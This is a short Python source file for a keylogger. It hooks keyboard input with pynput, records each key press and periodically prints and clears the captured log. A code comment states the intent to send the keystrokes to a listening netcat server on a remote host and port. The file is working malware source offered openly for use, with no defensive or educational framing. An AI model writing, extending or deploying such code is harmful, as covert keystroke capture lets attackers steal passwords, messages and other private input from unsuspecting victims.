#!/usr/bin/env python

import pynput.keyboard, threading

class Keylogger:

    def __init__(self, time_interval, host, port):
        self.key_log = ["Keylogger Started"]
        self.interval =  time_interval or 5
    
    def append_to_log(self, key):
        self.key_log.append(key)

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print("[+] Reporting...")
        print("".join(self.key_log)) # TODO: or send mail, etc - would rather send to listening nc server on self.host:self.port
        self.key_log = []
        timer = threading.Timer((self.interval*60), self.report)
        timer.start()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()